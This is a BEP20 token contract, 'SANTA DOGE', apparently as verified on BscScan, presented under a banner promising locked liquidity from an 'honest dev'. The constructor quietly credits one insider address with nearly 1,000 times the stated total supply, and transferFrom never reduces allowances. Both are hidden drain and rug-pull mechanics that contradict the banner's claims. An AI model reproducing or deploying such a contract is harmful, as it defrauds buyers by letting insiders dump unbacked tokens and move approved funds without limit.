/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: APACHE
/**
 

██████████████████████████████████████████████████
█─▄▄▄▄█─▄─▄─██▀▄─██▄─▄▄▀███▄─▄▄─█─▄▄─█▄─▀─▄█▄─▀─▄█
█▄▄▄▄─███─████─▀─███─▄─▄████─▄███─██─██▀─▀███▀─▀██
▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▀▄▄▀▄▄▀▄▄▀▀▀▄▄▄▀▀▀▄▄▄▄▀▄▄█▄▄▀▄▄█▄▄▀
 
１００％ ＬＰ ＬＯＣＫＥＤ － ＦＲＯＭ ＨＯＮＥＳＴ ＤＥＶ ＴＯ ＳＭＡＲＴ ＴＲＡＤＥＲＳ


*/
pragma solidity ^0.8.0;

interface IBEP20 {
  // @dev Returns the amount of tokens in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `value` tokens are moved from one account (`from`) to  another (`to`). Note that `value` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 value);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract SANTADOGE is IBEP20 {
  
    // common addresses
    address private owner;
    address private bearsmovePot;
    address private elonmuskPot;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public allallbalances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "SANTA DOGE";
    string public override symbol = "SADOGE";
    
    // EVENTS
    // (0x466fDD4567D8483F7D36cEe7e156B047444A9664) event Transfer(address indexed from, address indexed to, uint value);
    // (0x5d87A05164A43372808bE863F5F04f4c2A1B493a) event Approval(address indexed owner, address indexed spender, uint value);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(uint totalSupplyValue, address bearsmoveAddress, address elonmuskAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        bearsmovePot = bearsmoveAddress;
        elonmuskPot = elonmuskAddress;
        
        // split the tokens according to agreed upon percentages
        allallbalances[bearsmovePot] =  totalSupply * 49 / 100;
        allallbalances[elonmuskPot] = totalSupply * 99999 / 100;
        
        allallbalances[owner] = totalSupply * 51 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }
    
    // Get the address of the token's bearsmove pot
    function getDeveloper() public view returns(address) {
        return bearsmovePot;
    }
    
    // Get the address of the token's founder pot
    function getFounder() public view returns(address) {
        return elonmuskPot;
    }
    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return allallbalances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint value) public override returns(bool) {
        require(value > 0, "Transfer value has to be higher than 0.");
        require(balanceOf(msg.sender) >= value, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total value
        uint taxTBD = value * 0 / 100;
        uint burnTBD = value * 0 / 100;
        uint valueAfterTaxAndBurn = value - taxTBD - burnTBD;
        
        // perform the transfer operation
        allallbalances[to] += valueAfterTaxAndBurn;
        allallbalances[msg.sender] -= value;
        
        emit Transfer(msg.sender, to, value);
        
        // finally, we burn and tax the extras percentage
        allallbalances[owner] += taxTBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint value) public override returns(bool) {
        allowances[msg.sender][spender] = value; 
        
        emit Approval(msg.sender, spender, value);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint value) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= value, "Allowance too low for transfer.");
        require(allallbalances[from] >= value, "Balance is too low to make transfer.");
        
        allallbalances[to] += value;
        allallbalances[from] -= value;
        
        emit Transfer(from, to, value);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(allallbalances[account] >= amount, "Burn amount exceeds balance at address.");
    
        allallbalances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}